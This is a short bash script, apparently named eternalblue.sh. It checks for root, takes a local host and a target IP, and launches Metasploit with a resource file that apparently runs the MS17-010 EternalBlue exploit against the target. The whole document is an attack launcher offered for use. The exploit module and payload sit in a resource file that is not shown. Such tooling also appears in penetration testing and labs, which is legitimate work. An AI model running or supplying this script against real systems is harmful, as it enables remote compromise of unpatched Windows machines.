#!/bin/bash

# Check if the user is running the script with root privileges
if [ "$EUID" -ne 0 ]
then
  echo "Please run as root"
  exit
fi

# Check if the required number of arguments was provided
if [ $# -lt 2 ]
then
  echo " "
  echo "Syntax: eternalblue.sh 'localhost' 'target'" 
  echo "Example: ./eternalblue.sh 10.10.10.10 10.10.10.20"
  echo " "
    exit
fi

echo "Starting MSF and running /msfscripts/ms17_010.rc: "
# Run the resource file with the given payload
msfdb start
msfconsole -r ./msfscripts/ms17_010.rc
# msfconsole -r /msfscripts/ms17_010.rc -x "use $payload"
